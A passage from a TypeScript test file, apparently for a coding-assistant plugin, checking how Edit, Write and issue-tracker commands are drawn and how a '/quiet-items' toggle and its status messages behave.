      await $.tool.call({ tool: 'Edit', file_path: path, old_string: 'a', new_string: 'b' })
      const id = calls.ids.at(-1) ?? ''
      expect(
        await drawnUse($, {
          tool_use_id: id,
          tool: 'Edit',
          input: { file_path: path },
          isRunning: false,
          isErrored: false,
          isInterrupted: false,
        }),
      ).toEqual(ENGINE_ROW)
    })
  }

  quietTest('leaves a Write of another file to the engine', async (world, $, on) => {
    const calls = engineBeneath(on, world)
    calls.answer = () => ({ result: { type: 'create', filePath: `${ROOT}/notes.md` } })
    await startSession($)
    await $.tool.call({ tool: 'Write', file_path: `${ROOT}/notes.md`, content: 'x' })
    const id = calls.ids.at(-1) ?? ''
    expect(
      await drawnUse($, {
        tool_use_id: id,
        tool: 'Write',
        input: {},
        isRunning: false,
        isErrored: false,
        isInterrupted: false,
      }),
    ).toEqual(ENGINE_ROW)
  })
})

describe('/quiet-items', () => {
  quietTest('toggles this session and draws in full while off', async (world, $, on) => {
    const calls = engineBeneath(on, world)
    world.callChange = { ...emptyDiff(), created: [AB12] }
    await startSession($)
    const id = await runBash($, calls, 'br create --title x')
    expect(await drawnUse($, toolUse(id, 'br create --title x'))).not.toEqual(ENGINE_ROW)
    expect(await commandText($)).toBe(
      'quiet-items off for this session. Tracker commands draw in full.',
    )
    expect(await drawnUse($, toolUse(id, 'br create --title x'))).toEqual(ENGINE_ROW)
    expect(await commandText($)).toBe(
      'quiet-items on for this session. Tracker writes draw as one row.',
    )
    expect(await drawnUse($, toolUse(id, 'br create --title x'))).not.toEqual(ENGINE_ROW)
  })

  quietTest('starts from the mode setting', { options: { mode: 'off' } }, async (world, $, on) => {
    const calls = engineBeneath(on, world)
    world.callChange = { ...emptyDiff(), created: [AB12] }
    await startSession($)
    const id = await runBash($, calls, 'br create --title x')
    expect(await drawnUse($, toolUse(id, 'br create --title x'))).toEqual(ENGINE_ROW)
    expect(await commandText($)).toBe(
      'quiet-items on for this session. Tracker writes draw as one row.',
    )
    expect(await drawnUse($, toolUse(id, 'br create --title x'))).not.toEqual(ENGINE_ROW)
  })

  quietTest(
    'says why tracker commands draw in full when work items are unavailable',
    async (world, $, on) => {
      engineBeneath(on, world)
      world.snapshot = {
        ...okSnapshot(7),
        state: 'failed',
        reason: 'basicly tracker list exited 2. Run it in a shell to see why.',
      }
      await startSession($)
      await commandText($)
      expect(await commandText($)).toBe(
        'quiet-items on for this session, but work items are unavailable (basicly tracker list exited 2), so tracker commands draw in full.',
      )
    },
  )

  quietTest('says when basicly needs a terminal session', async (world, $, on) => {
    engineBeneath(on, world)
    world.snapshot = {
      ...okSnapshot(7),
      state: 'terminal-only',
      reason: null,
      source: 'basicly',
      sourceLabel: 'basicly',
    }
    await startSession($)
    await commandText($)
    expect(await commandText($)).toBe(
      'quiet-items on for this session, but basicly needs a terminal session here, so tracker commands draw in full.',
    )
  })

  quietTest('refuses an argument and changes nothing', async (world, $, on) => {
    engineBeneath(on, world)
    await startSession($)
    expect(await commandText($, 'x')).toBe(
      '/quiet-items takes no argument; it toggles this session. Set the default with the plugin\'s "mode" setting.',
    )
    expect(await commandText($)).toBe(
      'quiet-items off for this session. Tracker commands draw in full.',
    )
  })
})
